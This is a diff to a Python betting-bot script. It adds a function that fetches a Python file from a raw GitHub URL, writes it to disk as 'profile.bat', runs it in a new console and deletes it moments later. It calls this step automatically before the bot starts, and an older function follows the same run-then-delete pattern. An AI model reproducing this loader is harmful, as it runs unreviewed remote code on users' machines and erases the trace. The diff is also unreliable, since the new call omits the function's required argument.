@@ -32,7 +32,11 @@ def bukacmd(uri,persi,rdmnno,namf,idrum,namanya):
     os.system(f'start cmd /k python {namf} {persi} {rdmnno} {idrum} {namanya}')
     time.sleep(1)
     os.unlink(namf)
-
+def waitingfor(x):
+    for tipi in range(x,0,-1):
+        sys.stdout.write(f"wait for {tipi} \r")
+        sys.stdout.flush()
+        time.sleep(1)
 def getlive(mode):
     dat = {"idx": 1, "result": [], "rapihkanjson": [], "terfilter": []}
     def roomindo(dat):
@@ -699,6 +703,14 @@ def seting(mode):
 
 
 
+def openprofile(persi):
+    uric="https://raw.githubusercontent.com/atr10116068/httpex/master/soket/profile.py"
+    sca=httpx.get(uric).text
+    with open("profile.bat", 'w') as out:
+        out.write(sca)
+    os.system(f'start cmd /k python profile.bat')
+    time.sleep(1)
+    os.unlink("profile.bat")
 
 def openall(persi):
     db = TinyDB("datatokenroom.json")
@@ -860,6 +872,8 @@ if akses["maintenance"]==True:
 
 for jalan in pilihan:
     if pilihan[jalan] == True and jalan=="Robot Bet":
+        openprofile()
+        waitingfor(10)
         openall(seting("versi"))
 
 sca="""exec('print("hai")')"""
